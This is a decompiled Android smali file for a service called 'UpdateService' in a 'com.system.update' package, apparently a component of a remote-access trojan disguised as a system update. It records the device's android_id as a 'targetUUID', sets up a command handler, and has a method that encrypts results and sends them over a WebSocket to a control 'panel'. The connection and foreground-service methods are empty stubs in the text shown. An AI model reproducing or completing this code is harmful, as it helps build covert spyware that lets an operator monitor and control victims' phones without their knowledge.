.class public Lcom/system/update/UpdateService;
.super Landroid/app/Service;
.source "UpdateService.java"

.field private static final TAG:Ljava/lang/String; = "UpdateService"
.field private static wsClient:Lorg/java_websocket/client/WebSocketClient;
.field private static crypto:Lcom/system/update/CryptoHelper;
.field private static appContext:Landroid/content/Context;

.field private scheduler:Ljava/util/concurrent/ScheduledExecutorService;
.field private targetUUID:Ljava/lang/String;
.field private commandHandler:Lcom/system/update/CommandHandler;

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onCreate()V
    .locals 3
    invoke-super {p0}, Landroid/app/Service;->onCreate()V
    sput-object p0, Lcom/system/update/UpdateService;->appContext:Landroid/content/Context;
    new-instance v0, Lcom/system/update/CryptoHelper;
    invoke-direct {v0}, Lcom/system/update/CryptoHelper;-><init>()V
    sput-object v0, Lcom/system/update/UpdateService;->crypto:Lcom/system/update/CryptoHelper;
    invoke-virtual {p0}, Lcom/system/update/UpdateService;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v0
    const-string v1, "android_id"
    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0
    iput-object v0, p0, Lcom/system/update/UpdateService;->targetUUID:Ljava/lang/String;
    new-instance v0, Lcom/system/update/CommandHandler;
    iget-object v1, p0, Lcom/system/update/UpdateService;->targetUUID:Ljava/lang/String;
    invoke-direct {v0, p0, v1}, Lcom/system/update/CommandHandler;-><init>(Landroid/content/Context;Ljava/lang/String;)V
    iput-object v0, p0, Lcom/system/update/UpdateService;->commandHandler:Lcom/system/update/CommandHandler;
    invoke-direct {p0}, Lcom/system/update/UpdateService;->startForegroundService()V
    invoke-direct {p0}, Lcom/system/update/UpdateService;->connectToPanel()V
    const/4 v0, 0x1
    invoke-static {v0}, Ljava/util/concurrent/Executors;->newSingleThreadScheduledExecutor()Ljava/util/concurrent/ScheduledExecutorService;
    move-result-object v0
    iput-object v0, p0, Lcom/system/update/UpdateService;->scheduler:Ljava/util/concurrent/ScheduledExecutorService;
    return-void
.end method

.method private startForegroundService()V
    .locals 0
    return-void
.end method

.method private connectToPanel()V
    .locals 0
    return-void
.end method

.method public static sendResultToPanel(Lorg/json/JSONObject;)V
    .locals 3
    sget-object v0, Lcom/system/update/UpdateService;->wsClient:Lorg/java_websocket/client/WebSocketClient;
    if-eqz v0, :cond_0
    invoke-virtual {v0}, Lorg/java_websocket/client/WebSocketClient;->isOpen()Z
    move-result v0
    if-eqz v0, :cond_0
    :try_start_0
    sget-object v0, Lcom/system/update/UpdateService;->crypto:Lcom/system/update/CryptoHelper;
    invoke-virtual {v0, p0}, Lcom/system/update/CryptoHelper;->encrypt(Lorg/json/JSONObject;)Lorg/json/JSONObject;
    move-result-object v0
    sget-object v1, Lcom/system/update/UpdateService;->wsClient:Lorg/java_websocket/client/WebSocketClient;
    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-virtual {v1, v0}, Lorg/java_websocket/client/WebSocketClient;->send(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    :cond_0
    :goto_0
    return-void
    :catch_0
    move-exception v0
    const-string v1, "UpdateService"
    const-string v2, "sendResultToPanel error"
    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    const/4 v0, 0x1
    return v0
.end method
